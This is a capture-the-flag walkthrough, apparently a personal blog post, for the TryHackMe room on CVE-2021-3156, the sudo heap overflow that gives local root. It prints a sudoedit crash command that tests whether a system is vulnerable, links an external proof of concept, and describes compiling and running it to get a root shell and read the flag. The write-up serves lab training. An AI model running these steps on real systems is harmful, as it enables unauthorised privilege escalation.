---
title: TryHackMe Baron Samedit
date: 2021-07-23T00:56:23+05:30
lastmod: 2021-07-23T00:56:23+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://bit.ly/34sGFiK
featureimage: img/thm.png

categories:
  - TryHackMe
tags:
  - tryhackme
  - rooms
  - thm
  - Baron Samedit

draft: false
description: "TryHackMe Baron Samedit walkthrough — A tutorial room exploring CVE-2021-3156 in the Unix Sudo Program."
---
## OverView

|||
|---|---|
| <script src="https://tryhackme.com/badge/434937"></script>|
|Baron Samedit|![logo](https://tryhackme-images.s3.amazonaws.com/room-icons/b64a68fc8025073fc1cc1ba972380ebd.png)|
|room| [Baron Samedit](https://tryhackme.com/room/sudovulnssamedit)|

---

## Task 01: Deploy

---

## Task 02: Baron Samedit

In January 2021, Qualys released a blog post detailing a terrifying new vulnerability in the Unix sudo program.

Specifically, this was a heap buffer overflow allowing any user to escalate privileges to root -- no misconfigurations required. This exploit works with the default settings, for any user regardless of sudo permissions, which makes it all the scarier. The vulnerability has been patched, but affects any unpatched version of the sudo program from 1.8.2-1.8.31p2 and 1.9.0-1.9.5p1, meaning that it's been around for the last ten years.

The program was very quickly patched (with patched versions making their way into repositories soon after), so this exploit will no longer work on up-to-date targets; however, it is still incredibly powerful.

this vulnerability is a buffer overflow in the sudo program; however, this time the vulnerability is a heap buffer overflow, as opposed to the stack buffer overflow we saw before. The stack is a very regimented section of memory which stores various important aspects of a program. The heap, on the other hand, is reserved for dynamic allocation of memory, allowing for more flexibility in how values and constructs are created and accessed by a program. As with the previous room, we will not go into a huge amount of detail about how this works in the interests of keeping the content beginner friendly. All we really need to understand is that this vulnerability is incredibly powerful, and extremely wide-reaching.---

So, first up, what can we do to check whether a system is vulnerable?

Fortunately there is a very easy method we can use to check; simply enter this command into a terminal:

```bash
sudoedit -s '\' $(python3 -c 'print("A"*1000)')
```

If the system is vulnerable then this will overwrite the heap buffer and crash the program:

![img](https://assets.muirlandoracle.co.uk/thm/rooms/sudovulnssamedit/c32e7007f934.png)

This PoC: [GitHub](https://github.com/lockedbyte/CVE-Exploits/tree/master/CVE-2021-3156).

---

## Exploit the Vulnerability

- run the check:

```bash
sudoedit -s '\' $(python3 -c 'print("A"*1000)')

malloc(): memory corruption
Aborted (core dumped)
```

system is vulnerable, let's exploit it!!!

- `cd` into exploit dirctory
- run the `make` command

     ![img](https://i.imgur.com/WjpMFBv.png)

### After compiling the exploit, what is the name of the executable created

     ans is in above. run `ls` command to read the newly created executable file.

## Kaboom

_You should now have a root shell -- what is the flag in `/root/flag.txt`?_



run the exploit binary:

![img](https://i.imgur.com/qqzg6MY.png)

- read the flag.

     ![img](https://i.imgur.com/X8uqxDb.png)